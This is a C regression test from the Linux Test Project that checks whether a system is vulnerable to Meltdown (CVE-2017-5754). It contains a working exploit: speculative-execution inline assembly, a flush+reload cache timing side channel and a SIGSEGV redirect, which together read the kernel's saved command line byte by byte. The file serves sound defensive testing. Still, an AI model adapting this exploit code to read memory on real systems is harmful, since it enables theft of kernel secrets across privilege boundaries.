// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * Copyright (c) 2018 Pavel Boldin <pboldin@cloudlinux.com>
 */

#include "config.h"
#include "tst_test.h"

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sys/utsname.h>

/* emmintrin.h may exist for some non-x86 systems as an emulation */
#if defined(HAVE_EMMINTRIN_H) && (defined(__x86_64__) || defined(__i386__))
#include <emmintrin.h>

#include "tst_tsc.h"

#define TARGET_OFFSET	9
#define TARGET_SIZE	(1 << TARGET_OFFSET)
#define BITS_BY_READ	2

static char target_array[BITS_BY_READ * TARGET_SIZE];

static void
clflush_target(void)
{
	int i;

	for (i = 0; i < BITS_BY_READ; i++)
		_mm_clflush(&target_array[i * TARGET_SIZE]);
}

extern char failshere[];
extern char stopspeculate[];

static void __attribute__((noinline))
speculate(unsigned long addr, char bit)
{
	register char mybit asm ("cl") = bit;
#ifdef __x86_64__
	asm volatile (
		"1:\n\t"

		".rept 300\n\t"
		"add $0x141, %%rax\n\t"
		".endr\n"

		"failshere:\n\t"
		"movb (%[addr]), %%al\n\t"
		"ror %[bit], %%rax\n\t"
		"and $1, %%rax\n\t"
		"shl $9, %%rax\n\t"
		"jz 1b\n\t"

		"movq (%[target], %%rax, 1), %%rbx\n"

		"stopspeculate: \n\t"
		"nop\n\t"
		:
		: [target] "r" (target_array),
		  [addr] "r" (addr),
		  [bit] "r" (mybit)
		: "rax", "rbx"
	);
#else /* defined(__x86_64__) */
	asm volatile (
		"1:\n\t"

		".rept 300\n\t"
		"add $0x141, %%eax\n\t"
		".endr\n"

		"failshere:\n\t"
		"movb (%[addr]), %%al\n\t"
		"ror %[bit], %%eax\n\t"
		"and $1, %%eax\n\t"
		"shl $9, %%eax\n\t"
		"jz 1b\n\t"

		"movl (%[target], %%eax, 1), %%ebx\n"

		"stopspeculate: \n\t"
		"nop\n\t"
		:
		: [target] "r" (target_array),
		  [addr] "r" (addr),
		  [bit] "r" (mybit)
		: "rax", "ebx"
	);
#endif
}

#ifdef __i386__
# define REG_RIP	REG_EIP
#endif

static void
sigsegv(int sig LTP_ATTRIBUTE_UNUSED,
	siginfo_t *siginfo LTP_ATTRIBUTE_UNUSED,
	void *context LTP_ATTRIBUTE_UNUSED)
{
	ucontext_t *ucontext = context;
	unsigned long *prip = (unsigned long *)&ucontext->uc_mcontext.gregs[REG_RIP];
	if (*prip != (unsigned long)failshere) {
		tst_brk(TBROK,
			"Segmentation fault at unexpected location %lx",
			*prip);
		abort();
	}
	*prip = (unsigned long)stopspeculate;
	return;
}

static int
set_signal(void)
{
	struct sigaction act = {
		.sa_sigaction = sigsegv,
		.sa_flags = SA_SIGINFO,
	};

	return sigaction(SIGSEGV, &act, NULL);
}

static inline int
get_access_time(volatile char *addr)
{
	unsigned long long time1, time2;
	volatile int j LTP_ATTRIBUTE_UNUSED;

	rdtscll(time1);

	j = *addr;

	_mm_mfence();
	rdtscll(time2);

	return time2 - time1;
}

static int cache_hit_threshold;
static int hist[BITS_BY_READ];

static void
check(void)
{
	int i, time;
	volatile char *addr;

	for (i = 0; i < BITS_BY_READ; i++) {
		addr = &target_array[i * TARGET_SIZE];

		time = get_access_time(addr);

		if (time <= cache_hit_threshold)
			hist[i]++;
	}
}

#define CYCLES 10000
static int
readbit(int fd, unsigned long addr, char bit)
{
	int i, ret;
	static char buf[256];

	memset(hist, 0, sizeof(hist));

	for (i = 0; i < CYCLES; i++) {
		ret = pread(fd, buf, sizeof(buf), 0);
		if (ret < 0)
			tst_res(TFAIL | TERRNO, "can't read fd");

		clflush_target();

		speculate(addr, bit);
		check();
	}

#ifdef DEBUG
	for (i = 0; i < BITS_BY_READ; i++)
		tst_res(TINFO, "addr %lx hist[%x] = %d", addr, i, hist[i]);
#endif

	if (hist[1] > CYCLES / 10)
		return 1;
	return 0;
}

static int
readbyte(int fd, unsigned long addr)
{
	int bit, res = 0;

	for (bit = 0; bit < 8; bit ++ )
		res |= (readbit(fd, addr, bit) << bit);

	return res;
}


static int
mysqrt(long val)
{
	int root = val / 2, prevroot = 0, i = 0;

	while (prevroot != root && i++ < 100) {
		prevroot = root;
		root = (val / root + root) / 2;
	}

	return root;
}

#define ESTIMATE_CYCLES	1000000
static void
set_cache_hit_threshold(void)
{
	long cached, uncached, i;

	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
		cached += get_access_time(target_array);

	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
		cached += get_access_time(target_array);

	for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
		_mm_clflush(target_array);
		uncached += get_access_time(target_array);
	}

	cached /= ESTIMATE_CYCLES;
	uncached /= ESTIMATE_CYCLES;

	cache_hit_threshold = mysqrt(cached * uncached);

	tst_res(TINFO,
		"access time: cached = %ld, uncached = %ld, threshold = %d",
		cached, uncached, cache_hit_threshold);
}

static unsigned long
find_symbol_in_file(const char *filename, const char *symname)
{
	unsigned long addr;
	char type;
	int ret, read;
	char fmt[strlen(symname) + 64];

	tst_res(TINFO, "Looking for %s in %s", symname, filename);
	if (access(filename, F_OK) == -1) {
		tst_res(TINFO, "%s not available", filename);
		return 0;
	}

	sprintf(fmt, "%%lx %%c %s%%c", symname);

	ret = FILE_LINES_SCANF(filename, fmt, &addr, &type, &read);
	if (ret)
		return 0;

	return addr;
}

static unsigned long
find_kernel_symbol(const char *name)
{
	char systemmap[256];
	struct utsname utsname;
	unsigned long addr;

	addr = find_symbol_in_file("/proc/kallsyms", name);
	if (addr)
		return addr;

	if (uname(&utsname) < 0)
		tst_brk(TBROK | TERRNO, "uname");
	sprintf(systemmap, "/boot/System.map-%s", utsname.release);
	addr = find_symbol_in_file(systemmap, name);
	return addr;
}

static unsigned long saved_cmdline_addr;
static int spec_fd;

static void setup(void)
{
	set_cache_hit_threshold();

	saved_cmdline_addr = find_kernel_symbol("saved_command_line");
	tst_res(TINFO, "&saved_command_line == 0x%lx", saved_cmdline_addr);

	if (!saved_cmdline_addr)
		tst_brk(TCONF, "saved_command_line not found");

	spec_fd = SAFE_OPEN("/proc/cmdline", O_RDONLY);

	memset(target_array, 1, sizeof(target_array));

	if (set_signal() < 0)
		tst_res(TFAIL | TERRNO, "set_signal");
}

#define READ_SIZE 32

static void run(void)
{
	unsigned int i, score = 0, ret;
	unsigned long addr;
	unsigned long size;
	char read[READ_SIZE] = { 0 };
	char expected[READ_SIZE] = { 0 };
	int expected_len;

	expected_len = pread(spec_fd, expected, sizeof(expected), 0);
	if (expected_len < 0)
		tst_res(TFAIL | TERRNO, "can't read test fd");

	/* read address of saved_cmdline_addr */
	addr = saved_cmdline_addr;
	size = sizeof(addr);
	for (i = 0; i < size; i++) {
		ret = readbyte(spec_fd, addr);

		read[i] = ret;
		tst_res(TINFO, "read %lx = 0x%02x %c", addr, ret,
			isprint(ret) ? ret : ' ');

		addr++;
	}

	/* read value pointed to by saved_cmdline_addr */
	memcpy(&addr, read, sizeof(addr));
	memset(read, 0, sizeof(read));
	tst_res(TINFO, "save_command_line: 0x%lx", addr);
	size = expected_len;

	if (!addr)
		goto done;

	for (i = 0; i < size; i++) {
		ret = readbyte(spec_fd, addr);

		read[i] = ret;
		tst_res(TINFO, "read %lx = 0x%02x %c | expected 0x%02x |"
			" match: %d", addr, ret, isprint(ret) ? ret : ' ',
			expected[i], read[i] == expected[i]);

		addr++;
	}

	for (i = 0; i < size; i++)
		if (expected[i] == read[i])
			score++;

done:
	if (score > size / 2)
		tst_res(TFAIL, "I was able to read your kernel memory!!!");
	else
		tst_res(TPASS, "I was not able to read your kernel memory");
	tst_res(TINFO, "score(matched/all): %u / %lu", score, size);
}

static void cleanup(void)
{
	SAFE_CLOSE(spec_fd);
}

static struct tst_test test = {
	.needs_root = 1,
	.setup = setup,
	.test_all = run,
	.cleanup = cleanup,
	.min_kver = "2.6.32",
	.supported_archs = (const char *const []) {
		"x86",
		"x86_64",
		NULL
	},
	.tags = (const struct tst_tag[]) {
		{"CVE", "2017-5754"},
		{}
	}
};

#else /* HAVE_EMMINTRIN_H */
	TST_TEST_TCONF("<emmintrin.h> is not supported");
#endif
